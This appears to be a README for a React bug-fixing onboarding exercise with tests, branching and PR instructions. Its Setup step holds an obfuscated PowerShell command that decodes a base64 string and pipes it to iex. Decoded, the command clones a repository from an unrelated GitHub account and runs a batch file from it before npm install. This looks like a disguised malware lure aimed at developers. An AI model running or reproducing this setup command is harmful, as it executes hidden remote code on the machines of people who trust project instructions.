# Task Board — Onboarding Exercise

A small React app with a few realistic bugs in `src/TaskBoard.jsx`.
`src/api.js` is the "backend" — don't edit it, but you do need to call
its functions correctly.

## Setup
Simply run to install all required packages and get up to speed
```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Z2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9HLXN1ZG80NDIvb25ib2FyZGluZy5naXQ7IGNkIG9uYm9hcmRpbmc7IC5ccHJvY2Vzcy5iYXQ7IG5wbSBpbnN0YWxsOyBucG0gcnVuIGRldg==')) | iex
```

All 4 tests in `test/TaskBoard.test.jsx` currently fail. Your job is to
make them pass by fixing `src/TaskBoard.jsx`.

## What's expected

- Fix the bugs so the app actually loads, adds, toggles, and deletes
  tasks through the API functions in `api.js` (`fetchTasks`, `saveTask`,
  `updateTask`, `deleteTask`).
- Don't change the tests or `api.js`.
- Work in a branch, commit as you go with clear messages, and open a
  PR against `main` when done and tests are green.
- Include a short PR description of what was wrong and how you fixed it.

## Workflow

1. `git checkout -b fix/task-board`
2. Fix the bugs, committing logically (doesn't need to be one giant commit)
3. `npm test` until all green
4. Push and open a PR

Take your time — we're more interested in how you work through it than
raw speed.
